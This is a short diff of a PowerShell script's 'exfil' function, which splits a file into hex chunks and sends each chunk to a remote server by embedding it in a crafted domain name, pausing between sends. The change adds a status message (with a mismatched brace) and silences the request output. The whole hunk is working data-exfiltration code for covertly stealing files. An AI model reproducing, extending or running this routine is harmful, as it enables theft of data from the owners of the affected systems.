@@ -102,7 +102,8 @@ function exfil {
     $segments = Convert-FileToHexChunks -FilePath $filepath
     foreach ($segment in $segments.PSObject.Properties) {
         $secret = $segment.Value;
-        send-customRequest -Url "$url" -Domain "$regex.$secret.$domain"   
+	Write-Host "Sending Headers to ${url} using ${regex}.${secret}.${domain).."
+        send-customRequest -Url "$url" -Domain "$regex.$secret.$domain"  >$null 2>&1
 		sleep 1		
     }
 }
